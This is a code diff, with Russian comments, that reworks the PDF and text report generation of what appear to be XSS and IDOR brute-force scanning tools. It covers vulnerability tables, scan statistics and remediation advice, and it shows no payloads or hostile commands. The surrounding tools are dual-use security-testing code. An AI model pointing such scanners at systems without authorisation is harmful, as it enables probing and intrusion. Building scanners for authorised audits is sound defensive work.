+                        ['Время обнаружения', vuln.get('timestamp', 'N/A')]
+                    ]
+                    if 'url' in vuln:
+                         vuln_data.append(['URL', vuln['url']])
+                    if 'parameter' in vuln:
+                         vuln_data.append(['Параметр', vuln['parameter']])
+                    if 'vulnerable_field' in vuln:
+                         vuln_data.append(['Поле формы', vuln['vulnerable_field']])
+                    if 'form_action' in vuln:
+                         vuln_data.append(['Действие формы', vuln['form_action']])
+                    if 'recommendation' in vuln:
+                         vuln_data.append(['Рекомендация', vuln['recommendation']])
+
+                    #Создаем таблицу для уязвимости
+                    vuln_table_data = []
+                    for row in vuln_data:
+                        table_row = []
+                        for cell in row:
+                            table_row.append(Paragraph(str(cell), table_style))
+                        vuln_table_data.append(table_row)
+
+                    vuln_table = Table(vuln_table_data, colWidths=[150, 350])
+                    #Цвет в зависимости от уверенности
+                    if vuln.get('confidence') == 'High':
+                        header_color = colors.HexColor('#E74C3C')  # Красный
+                        row_color = colors.HexColor('#FDEDEC')  # Светло-красный
+                    elif vuln.get('confidence') == 'Medium':
+                        header_color = colors.HexColor('#F39C12')  # Оранжевый
+                        row_color = colors.HexColor('#FEF5E7')  # Светло-оранжевый
+                    else: # Low
+                        header_color = colors.HexColor('#3498DB')  # Синий
+                        row_color = colors.HexColor('#EBF5FB')  # Светло-синий
+
+                    vuln_table.setStyle(TableStyle([
+                        ('BACKGROUND', (0, 0), (-1, 0), header_color),
+                        ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
+                        ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
+                        ('FONTNAME', (0, 0), (-1, 0), font_name if fonts_setup else 'Helvetica-Bold'),
+                        ('BACKGROUND', (0, 1), (-1, -1), row_color),
+                        ('GRID', (0, 0), (-1, -1), 1, colors.HexColor('#E5E7E9')),
+                        ('ROWBACKGROUNDS', (0, 1), (-1, -1), [colors.white, row_color])
+                    ]))
+                    story.append(vuln_table)
+                    story.append(Spacer(1, 12))
+            else:
+                 story.append(Paragraph("Уязвимости не обнаружены.", normal_style))
+
+            story.append(Spacer(1, 12))
+
+            #Рекомендации по безопасности
+            story.append(PageBreak())
+            story.append(Paragraph("Рекомендации по устранению XSS уязвимостей", heading_style))
+            story.append(Spacer(1, 12))
+
+            story.append(Paragraph("1. ДЛЯ REFLECTED XSS:", subheading_style))
+            recommendations = [
+                "Всегда экранируйте пользовательский ввод перед выводом на страницу",
+                "Валидируйте входные данные (белые списки лучше черных)",
+                "Кодируйте специальные символы: <, >, \", ', &",
+                "Используйте Content Security Policy (CSP) для ограничения выполнения JS"
+            ]
+            for rec in recommendations:
+                story.append(Paragraph(rec, normal_style))
+            story.append(Spacer(1, 12))
+
+            story.append(Paragraph("2. ДЛЯ DOM-BASED XSS:", subheading_style))
+            recommendations = [
+                "Используйте textContent вместо innerHTML",
+                "Используйте Content Security Policy (CSP)",
+                "Регулярно обновляйте JavaScript библиотеки",
+                "Валидируйте и экранируйте данные из недоверенных источников (URL, localStorage и т.д.)"
+            ]
+            for rec in recommendations:
+                story.append(Paragraph(rec, normal_style))
+            story.append(Spacer(1, 12))
+
+            story.append(Paragraph("3. ДЛЯ STORED XSS:", subheading_style))
+            recommendations = [
+                "Экранируйте данные при сохранении И при выводе",
+                "Ограничивайте длину и тип вводимых данных",
+                "Реализуйте moderation для пользовательского контента",
+                "Шифруйте чувствительные данные при хранении"
+            ]
+            for rec in recommendations:
+                story.append(Paragraph(rec, normal_style))
+            story.append(Spacer(1, 12))
+
+            story.append(Paragraph("4. ОБЩИЕ МЕРЫ:", subheading_style))
+            recommendations = [
+                "Используйте X-XSS-Protection заголовки",
+                "Регулярно проводите тестирование на проникновение",
+                "Обучайте разработчиков принципам безопасного программирования",
+                "Внедряйте практики SAST/DAST в процесс CI/CD"
+            ]
+            for rec in recommendations:
+                story.append(Paragraph(rec, normal_style))
+
+            story.append(Spacer(1, 20))
+
+            #Заключение
+            story.append(Paragraph("Заключение", heading_style))
+            story.append(Paragraph(
+                "Данный отчет содержит результаты автоматизированного аудита безопасности "
+                "на предмет уязвимостей типа XSS (Cross-Site Scripting). "
+                "Найденные уязвимости требуют внимательного рассмотрения и устранения.",
+                normal_style
+            ))
+
+            story.append(Spacer(1, 20))
+
+            #PDF отчёт
+            doc.build(story)
+            print(f"PDF отчет успешно создан: {filename}")
+            if not fonts_setup:
+                print("Внимание: Русский текст может отображаться некорректно в PDF")
+                print("Для правильного отображения установите шрифты с поддержкой кириллицы")
+
+        except Exception as e:
+            print(f"Ошибка создания PDF отчета: {e}")
+            import traceback
+            traceback.print_exc()
+            #текстовый отчет как запасной вариант
+            self.generate_text_report(filename.replace('.pdf', '.txt'))
+
+    def generate_text_report(self, filename="xss_report.txt"):
+        """Генерирует текстовый отчет в стиле IDOR отчета"""
+        if not filename:
+            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+            filename = f"xss_report_{self.base_domain}_{timestamp}.txt"
+
+        duration = time.time() - self.stats['start_time']
+        report_lines = []
+        report_lines.append("Отчет об аудите XSS уязвимостей")
+        report_lines.append("=" * 80)
+        report_lines.append(f"Цель: {self.target_url}")
+        report_lines.append(f"Домен: {self.base_domain}")
+        report_lines.append(f"Дата сканирования: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+        report_lines.append(f"Общее время: {duration:.2f} секунд")
+        report_lines.append(f"Загружено XSS векторов: {len(self.xss_payloads)}")
+        report_lines.append(f"Отправлено HTTP запросов: {self.stats['requests_sent']}")
+        report_lines.append(f"Проверено страниц: {self.stats['pages_scanned']}")
+        report_lines.append(f"Найдено форм: {self.stats['forms_found']}")
+        report_lines.append(f"Протестировано параметров: {self.stats['parameters_tested']}")
+        report_lines.append(f"Найдено уязвимостей: {len(self.vulnerabilities)}")
+        report_lines.append("")
+        report_lines.append("Статистика сканирования")
+        report_lines.append(f"Время сканирования: {duration:.2f} секунд")
+        report_lines.append(f"Запросов: {self.stats['requests_sent']}")
+        report_lines.append(f"Страниц: {self.stats['pages_scanned']}")
+        report_lines.append(f"Форм: {self.stats['forms_found']}")
+        report_lines.append(f"Параметров: {self.stats['parameters_tested']}")
+        report_lines.append(f"Уязвимостей: {self.stats['vulnerabilities_found']}")
+        report_lines.append(f"Reflected XSS: {self.stats['reflected_xss']}")
+        report_lines.append(f"DOM-based XSS (потенц.): {self.stats['dom_xss_potential']}")
+        report_lines.append(f"Stored XSS (потенц.): {self.stats['stored_xss_potential']}")
+        report_lines.append("")
+
+        if self.vulnerabilities:
+            report_lines.append("Найденные уязвимости XSS")
+            report_lines.append("-" * 80)
+            for i, vuln in enumerate(self.vulnerabilities, 1):
+                report_lines.append(f"{i}. {vuln['type']}")
+                report_lines.append(f"   Уверенность: {vuln.get('confidence', 'Неизвестно')}")
+                report_lines.append(f"   Метод: {vuln.get('method', 'N/A')}")
+                report_lines.append(f"   Код ответа: {vuln.get('response_code', 'N/A')}")
+                report_lines.append(f"   Описание: {vuln.get('description', 'Нет описания')}")
+                report_lines.append(f"   Пейлоад: {vuln.get('payload', 'N/A')}")
+                report_lines.append(f"   Время: {vuln.get('timestamp', 'N/A')}")
+
+                if 'url' in vuln:
+                     report_lines.append(f"   URL: {vuln['url']}")
+                if 'parameter' in vuln:
+                     report_lines.append(f"   Параметр: {vuln['parameter']}")
+                if 'vulnerable_field' in vuln:
+                     report_lines.append(f"   Поле формы: {vuln['vulnerable_field']}")
+                if 'form_action' in vuln:
+                     report_lines.append(f"   Действие формы: {vuln['form_action']}")
+                if 'recommendation' in vuln:
+                     report_lines.append(f"   Рекомендация: {vuln.get('recommendation', 'Нет рекомендации')}")
+                report_lines.append("")
+        else:
+            report_lines.append("Уязвимости не найдены")
+            report_lines.append("")
+
+        report_lines.append("Рекомендации по устранению XSS")
+        report_lines.append("1. ДЛЯ REFLECTED XSS:")
+        report_lines.append("   - Экранируйте пользовательский ввод перед выводом")
+        report_lines.append("   - Валидируйте входные данные")
+        report_lines.append("   - Кодируйте специальные символы")
+        report_lines.append("   - Используйте CSP")
+        report_lines.append("")
+        report_lines.append("2. ДЛЯ DOM-BASED XSS:")
+        report_lines.append("   - Используйте textContent вместо innerHTML")
+        report_lines.append("   - Валидируйте данные из URL и других источников")
+        report_lines.append("   - Обновляйте JS библиотеки")
+        report_lines.append("")
+        report_lines.append("3. ДЛЯ STORED XSS:")
+        report_lines.append("   - Экранируйте данные при сохранении и выводе")
+        report_lines.append("   - Ограничивайте вводимые данные")
+        report_lines.append("   - Проводите модерацию контента")
+        report_lines.append("")
+        report_lines.append("4. ОБЩИЕ МЕРЫ:")
+        report_lines.append("   - Используйте X-XSS-Protection заголовки")
+        report_lines.append("   - Регулярно тестируйте приложение")
+        report_lines.append("   - Обучайте разработчиков")
+        report_lines.append("")
+
+
+        report_lines.append("Конец отчета")
+
+
+        with open(filename, 'w', encoding='utf-8') as f:
+            f.write('\n'.join(report_lines))
+
+        print(f"\nТекстовый отчет сохранен в файл: {filename}")
 
     def generate_xss_report(self, filename=None):
-        """Генерация отчета по XSS сканированию"""
+        """Генерация отчета по XSS сканированию (обновленный метод)"""
         if not filename:
             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
             filename = f"xss_audit_{self.base_domain}_{timestamp}"
 
         print(f"\nГенерация отчетов")
-
         #Текстовый отчет
-        txt_report = self._generate_text_xss_report(filename)
+        txt_report = f"{filename}.txt"
+        self.generate_text_report(txt_report)
         print(f"Текстовый отчет: {txt_report}")
 
         #PDF отчет
         if PDF_SUPPORT:
             try:
-                pdf_report = self._generate_pdf_xss_report(filename)
+                pdf_report = f"{filename}.pdf"
+                self.generate_pdf_report(pdf_report)
                 print(f"PDF отчет: {pdf_report}")
             except Exception as e:
                 print(f"Ошибка создания PDF: {e}")
+        else:
+            print("PDF отчет не создан (reportlab не установлен)")
 
         return txt_report
-
-    def _generate_text_xss_report(self, base_filename):
-        """Генерация текстового отчета по XSS"""
-        filename = f"{base_filename}.txt"
-
-        with open(filename, 'w', encoding='utf-8') as f:
-            f.write("=" * 80 + "\n")
-            f.write("Отчёт об XSS аудите безопасности\n")
-            f.write("=" * 80 + "\n\n")
-            f.write("1. Информация о сканировании\n")
-            f.write("-" * 80 + "\n")
-            f.write(f"Цель сканирования: {self.target_url}\n")
-            f.write(f"Домен: {self.base_domain}\n")
-            f.write(f"Начало сканирования: {datetime.fromtimestamp(self.stats['start_time']).strftime('%Y-%m-%d %H:%M:%S')}\n")
-            f.write(f"Длительность сканирования: {time.time() - self.stats['start_time']:.2f} секунд\n")
-            f.write(f"Всего XSS векторов: {len(self.xss_payloads)}\n\n")
-            f.write("2. Статистика сканирования\n")
-            f.write("-" * 80 + "\n")
-            f.write(f"Отправлено HTTP запросов: {self.stats['requests_sent']}\n")
-            f.write(f"Проверено страниц: {self.stats['pages_scanned']}\n")
-            f.write(f"Найдено HTML форм: {self.stats['forms_found']}\n")
-            f.write(f"Протестировано параметров: {self.stats['parameters_tested']}\n\n")
-            f.write("3. Результаты тестирования\n")
-            f.write("-" * 80 + "\n")
-            f.write(f"Всего обнаружено проблем: {self.stats['vulnerabilities_found']}\n")
-            f.write(f"Reflected XSS: {self.stats['reflected_xss']}\n")
-            f.write(f"DOM-based XSS (потенциальные): {self.stats['dom_xss_potential']}\n")
-            f.write(f"Stored XSS (потенциальные): {self.stats['stored_xss_potential']}\n\n")
-
-            if self.vulnerabilities:
-                f.write("4. Детали обнаруженных уязвимостей\n")
-                f.write("-" * 80 + "\n")
-
-                #Reflected XSS
-                reflected = [v for v in self.vulnerabilities if 'Reflected' in v.get('type', '')]
-                if reflected:
-                    f.write("\n4.1. reflected XSS уязвимости\n")
-                    f.write("-" * 40 + "\n")
-                    for i, vuln in enumerate(reflected, 1):
-                        f.write(f"\n{i}. {vuln['type']}\n")
-                        f.write(f"   Уверенность: {vuln.get('confidence', 'Неизвестно')}\n")
-                        if 'url' in vuln:
-                            f.write(f"URL: {vuln['url']}\n")
-                        elif 'form_action' in vuln:
-                            f.write(f"Форма: {vuln['form_action']}\n")
-                        if 'parameter' in vuln:
-                            f.write(f"Уязвимый параметр: {vuln['parameter']}\n")
-                        elif 'vulnerable_field' in vuln:
-                            f.write(f"Уязвимое поле: {vuln['vulnerable_field']}\n")
-                        f.write(f"Использованный пейлоад: {vuln.get('payload', 'N/A')}\n")
-                        f.write(f"Метод: {vuln.get('method', 'N/A')}\n")
-                        f.write(f"Описание: {vuln.get('description', 'Нет описания')}\n")
-                        f.write(f"Время обнаружения: {vuln.get('timestamp', 'N/A')}\n")
-
-                #DOM-based XSS
-                dom_based = [v for v in self.vulnerabilities if 'DOM-based' in v.get('type', '')]
-                if dom_based:
-                    f.write("\n4.2. DOM-BASED XSS (ПОТЕНЦИАЛЬНЫЕ)\n")
-                    f.write("-" * 40 + "\n")
-                    for i, vuln in enumerate(dom_based, 1):
-                        f.write(f"\n{i}. {vuln['type']}\n")
-                        f.write(f"Уверенность: {vuln.get('confidence', 'Неизвестно')}\n")
-                        f.write(f"Опасная функция/источник: {vuln.get('dangerous_function', vuln.get('untrusted_source', 'N/A'))}\n")
-                        f.write(f"Описание: {vuln.get('description', 'Нет описания')}\n")
-                        f.write(f"Рекомендация: {vuln.get('recommendation', 'Нет рекомендации')}\n")
-
-                #Stored XSS
-                stored = [v for v in self.vulnerabilities if 'Stored' in v.get('type', '')]
-                if stored:
-                    f.write("\n4.3. Stored XSS (ПОТЕНЦИАЛЬНЫЕ)\n")
-                    f.write("-" * 40 + "\n")
-                    for i, vuln in enumerate(stored, 1):
-                        f.write(f"\n{i}. {vuln['type']}\n")
-                        f.write(f"Уверенность: {vuln.get('confidence', 'Неизвестно')}\n")
-                        f.write(f"Форма/поле: {vuln.get('form_action', 'N/A')} - {vuln.get('field_name', 'N/A')}\n")
-                        f.write(f"Описание: {vuln.get('description', 'Нет описания')}\n")
-                        f.write(f"Рекомендация: {vuln.get('recommendation', 'Нет рекомендации')}\n")
-
-            f.write("\n5. Рекомендации по безопасности\n")
-            f.write("-" * 80 + "\n")
-
-            f.write("\n5.1. Для reflected XSS:\n")
-            f.write("Всегда экранируйте пользовательский ввод перед выводом на страницу\n")
-            f.write("Валидируйте входные данные (белые списки лучше черных)\n")
-            f.write("Кодируйте специальные символы: <, >, \", ', &\n")
-
-            f.write("\n5.2. Для dom-based XSS:\n")
-            f.write("Используйте textContent вместо innerHTML\n")
-            f.write("Используйте Content Security Policy (CSP)\n")
-            f.write("Регулярно обновляйте JavaScript библиотеки\n")
-
-            f.write("\n5.3. Для Stored XSS:\n")
-            f.write("Экранируйте данные при сохранении И при выводе\n")
-            f.write("Ограничивайте длину и тип вводимых данных\n")
-            f.write("Реализуйте moderation для пользовательского контента\n")
-
-            f.write("\n5.4. Общие меры:\n")
-            f.write("Используйте X-XSS-Protection заголовки\n")
-            f.write("Регулярно проводите тестирование на проникновение\n")
-
-            f.write("\n" + "=" * 80 + "\n")
-            f.write("КОНЕЦ ОТЧЕТА\n")
-            f.write("=" * 80 + "\n")
-
-        return filename
-
 
 def main():
     """Основная функция для запуска XSS-сканера"""
     parser = argparse.ArgumentParser(description='XSS-сканер')
-
     parser.add_argument('url', help='URL сайта для XSS сканирования')
     parser.add_argument('--threads', type=int, default=10,
                         help='Количество потоков (по умолчанию: 10)')
@@ -1007,15 +1253,14 @@ def main():
                         help='Имя файла для отчета (без расширения)')
     parser.add_argument('--fast', action='store_true',
                         help='Быстрое сканирование (меньше тестов)')
-
     args = parser.parse_args()
 
-    #Проверка URL
+    # Проверка URL
     if not args.url.startswith(('http://', 'https://')):
-        print("Укажите полный URL (http:// или https://)")
+        print("Укажите полный URL")
         return
 
-    #Парсинг cookies
+    # Парсинг cookies
     cookies_dict = {}
     if args.cookies:
         for cookie in args.cookies.split(';'):
@@ -1033,25 +1278,21 @@ def main():
         if args.fast:
             print("Запуск быстрого сканирования")
             scanner.xss_payloads = scanner.xss_payloads[:20]
-
         print("Начало XSS сканирования")
         vulnerabilities = scanner.full_xss_scan()
-
         if args.output:
             scanner.generate_xss_report(args.output)
         else:
             scanner.generate_xss_report()
-
     except KeyboardInterrupt:
         print("Сканирование прервано пользователем")
     except Exception as e:
         print(f"Критическая ошибка: {e}")
-
+        import traceback
+        traceback.print_exc()
 
 if __name__ == "__main__":
     main()
-
-
 
 import requests
 import re
@@ -1809,8 +2050,7 @@ class SimpleIDORBruteforceScanner:
                 for i, vuln in enumerate(self.vulnerabilities, 1):
                     story.append(Paragraph(f"Уязвимость #{i}: {vuln['type']}", subheading_style))
 
-                    vuln_data = [
-                        ['Параметр', 'Значение'],
+                    vuln_data = [['Параметр', 'Значение'],
                         ['URL', vuln['url']],
                         ['Комбинация', vuln['combo']],
                         ['Тип', vuln['type']],
@@ -1819,8 +2059,7 @@ class SimpleIDORBruteforceScanner:
                         ['Уверенность', vuln.get('confidence', 'Неизвестно')],
                         ['Доказательства', vuln.get('evidence', 'Нет')],
                         ['Метод обнаружения', vuln.get('discovery_method', 'Bruteforce')],
-                        ['Время обнаружения', vuln.get('timestamp', 'N/A')]
-                    ]
+                        ['Время обнаружения', vuln.get('timestamp', 'N/A')]]
 
                     #Создаем таблицу для уязвимости
                     vuln_table_data = []
@@ -1878,7 +2117,7 @@ class SimpleIDORBruteforceScanner:
             story.append(Paragraph("2.БЕЗОПАСНЫЕ ИДЕНТИФИКАТОРЫ:", subheading_style))
             recommendations = [
                 "Используйте UUID/GUID вместо последовательных чисел",
-                "Минимальная длина идентификатора - 16+ случайных символов",
+                "Минимальная длина идентификатора 16+ случайных символов",
                 "Регулярно меняйте идентификаторы сессий",
                 "Не используйте предсказуемые паттерны (user1, user2)"
             ]
@@ -1901,7 +2140,7 @@ class SimpleIDORBruteforceScanner:
 
             story.append(Spacer(1, 12))
 
-            story.append(Paragraph("4. МОНИТОРИНГ И АУДИТ:", subheading_style))
+            story.append(Paragraph("4. Аудит:", subheading_style))
             recommendations = [
                 "Ведите логи всех запросов к защищенным ресурсам",
                 "Настройте оповещения о подозрительной активности",
@@ -1926,7 +2165,7 @@ class SimpleIDORBruteforceScanner:
 
             story.append(Spacer(1, 20))
 
-            # Генерируем PDF
+            #PDF отчёт
             doc.build(story)
             print(f"PDF отчет успешно создан: {filename}")
 
@@ -1938,7 +2177,7 @@ class SimpleIDORBruteforceScanner:
             print(f"Ошибка создания PDF отчета: {e}")
             import traceback
             traceback.print_exc()
-            #Создаем текстовый отчет как запасной вариант
+            #текстовый отчет как запасной вариант
             self.generate_text_report(filename.replace('.pdf', '.txt'))
 
     def generate_text_report(self, filename="idor_report.txt"):
